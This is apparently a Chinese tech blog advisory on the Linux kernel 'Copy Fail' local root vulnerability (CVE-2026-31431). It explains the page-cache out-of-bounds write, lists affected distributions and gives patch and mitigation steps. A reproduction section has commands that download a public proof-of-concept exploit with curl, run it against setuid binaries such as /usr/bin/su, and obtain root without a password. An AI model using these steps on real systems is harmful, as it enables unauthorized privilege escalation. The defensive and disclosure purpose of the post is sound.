#  Linux 高危漏洞爆发！普通用户可直接提权 root  
原创 didiplus
                    didiplus  攻城狮成长日记   2026-04-30 09:16  
  
   
  
最近，Linux 安全圈出现了一个值得高度警惕的漏洞：  
  
漏洞代号：Copy Fail   
CVE-2026-31431[1]  
  
这是一个**无需复杂条件、可稳定利用的本地提权漏洞**  
。  
  
一旦被利用，攻击者可以：  
  
👉 **从普通用户直接获取 root 权限**  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/kztGyHFwmfydt4VLXJyRVg3me5sUpF5vhSsRZKbnukVHtbeG21ibKwIvayfIkFHHmpOjAeOVIz5acGoAJwagpFx22iaBAqVUGxT8NdvNKDk9E/640?wx_fmt=png&from=appmsg "null")  
  
### 🧨 为什么这个漏洞必须重视？  
  
Linux Kernel  
是整个系统的核心：  
- • 云服务器  
  
- • 容器平台（K8s）  
  
- • 数据库服务器  
  
- • 企业基础设施  
  
几乎全部依赖它运行。  
  
而这次漏洞影响的是：  
  
👉 **内核 Crypto API（加密子系统）**  
  
这意味着：  
> **攻击面广 + 利用价值极高**  
  
### ⚙️ 漏洞核心：一个“看似优化”的设计失误  
  
先用一句话讲清本质👇  
> **一次性能优化，引入了一个可控内存越界写漏洞**  
  
#### 🔍 涉及组件  
- • **AF_ALG**  
：用户态调用内核加密能力的接口  
  
- • **algif_aead**  
：负责 AEAD 加解密处理  
  
- • **authencesn**  
：支持 IPsec 扩展序列号（ESN）  
  
#### ⚠️ 问题是怎么产生的？  
  
在 2017 年的一次优化中（commit 72548b093ee3  
）：  
  
👉 内核引入了 **in-place（就地）解密机制**  
  
也就是说：  
- • 不再复制数据  
  
- • 直接在原始缓冲区上操作  
  
本意是：  
  
👉 提升性能  
  
但问题来了👇  
#### 💥 致命缺陷  
  
在 authencesn  
 算法处理中：  
- • 会向缓冲区 assoclen + cryptlen  
 位置写入 **4 字节数据**  
  
- • 这个位置**没有严格边界检查**  
  
当通过 recvmsg()  
 触发解密时：  
  
👉 这 4 字节写入可能**越界**  
#### 🚨 最严重的后果  
  
由于 AF_ALG 使用了 splice()  
：  
  
👉 数据可能直接映射到**文件页缓存（page cache）**  
  
最终效果：  
> 💣 攻击者可以**篡改任意已打开文件的页缓存内容（4 字节）**  
  
### 🧠 这个漏洞真正可怕的地方  
  
很多漏洞“理论上危险”，但难利用。  
  
这个不一样👇  
#### ⚡ 特点 1：稳定利用（无需竞争条件）  
- • 不需要 race condition  
  
- • 不需要多次尝试  
  
- • 一次成功  
  
👉 **利用门槛极低**  
#### ⚡ 特点 2：精准篡改关键文件  
  
攻击者可以修改：  
```
/usr/bin/su
```  
  
或其他：  
- • setuid  
程序  
  
- • 系统工具  
  
👉 实现 **直接提权**  
#### ⚡ 特点 3：不触发磁盘写入（隐蔽性极强）  
  
关键点来了👇  
> 修改的是 **页缓存（内存）**  
，不是磁盘文件  
  
  
意味着：  
- • 不会留下文件修改痕迹  
  
- • 不触发传统监控  
  
- • 难以取证  
  
👉 **隐蔽性极高**  
#### ⚡ 特点 4：可用于持久化攻击  
  
攻击者可以：  
- • 修改关键程序执行路径  
  
- • 注入恶意逻辑  
  
- • 长期控制系统  
  
### 📌 漏洞详情（整理版）  
- • **漏洞名称**  
：Linux Kernel  
 本地权限提升漏洞（Copy Fail）  
  
- • **漏洞编号**  
：CVE-2026-31431  
  
- • **漏洞类型**  
：本地提权（LPE）  
  
- • **危害等级**  
：高危  
  
- • **影响范围**  
：```
72548b093ee3 <= commit < a664bf3d603d
```  
  
  
### 🖥️ 受影响系统（重点关注）  
  
目前已确认影响的系统包括：  
- • Ubuntu 24.04 LTS  
  
- • Amazon Linux 2023  
  
- • Red Hat Enterprise Linux 8 / 9 / 10  
  
- • SUSE 16  
  
👉 以及其他基于相关内核版本的发行版  
### 完整复现步骤  
#### 步骤1：获取POC脚本  
```
# 推荐方式curl -O https://github.com/theori-io/copy-fail-CVE-2026-31431#或者官方提供的快捷方式curl https://copy.fail/exp -o copy_fail_exp.py
```  
> 运行脚本之前先要备份/usr/bin/su  
的文件  
  
##### 步骤2：运行利用脚本  
```
python3 copy_fail_exp.py
```  
> 脚本默认会针对/usr/bin/su  
进行攻击，你也可以指定其他setuid二进制：  
  
```
python3 copy_fail_exp.py /bin/ping
```  
  
整个过程同城在几秒到十几秒内完成，脚本会自动完成page cache  
注入。  
#### 步骤3：验证提权  
```
su#或者直接执行sudo -i
```  
  
成功的话，你会直接获取root权限(**无需输入密码**  
)，输入id  
命令应该显示uid=0(root)   
#### 步骤4: 测试完成后如何清理  
```
### 清理page cache (推荐)echo 3 > /proc/sys/vm/drop_caches# 回复原始文件sudo cp -a /usr/bin/su.bak /usr/bin/su
```  
### 🛠️ 修复方案（必须执行）  
#### ✅ 1、升级内核（首选方案）  
  
官方补丁已发布[2]  
  
只要满足：  
```
commit >= a664bf3d603d
```  
  
即可修复漏洞。  
#### ✅ 2、关注发行版安全公告  
- •   
Ubuntu[3]  
  
- •   
Red Hat[4]  
  
👉 建议订阅安全更新通知  
### ⚠️ 临时缓解方案（无法升级时）  
  
如果短时间无法升级，可以：  
  
👉 **禁用受影响模块**  
```
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif-aead.conf
```  
  
然后执行：  
```
reboot
```  
> ⚠️ 注意  
  
这是**临时措施**  
：  
> • 可能影响依赖 AEAD 的应用• 不能替代补丁升级  
  
### 💬 总结  
  
Copy Fail（CVE-2026-31431）  
的危险在于：  
- • 利用稳定  
  
- • 无需复杂条件  
  
- • 可直接提权  
  
- • 隐蔽性极强  
  
**📌 一句话结论:  如果你还没升级内核，那你的服务器就已经处于风险之中。**  
#### 引用链接  
  
[1]  
 CVE-2026-31431: https://www.cve.org/CVERecord?id=CVE-2026-31431  
[2]  
 官方补丁已发布: https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5  
[3]  
 Ubuntu: https://ubuntu.com/security/CVE-2026-31431  
[4]  
 Red Hat: https://access.redhat.com/security/cve/cve-2026-31431  
  
   
  
  
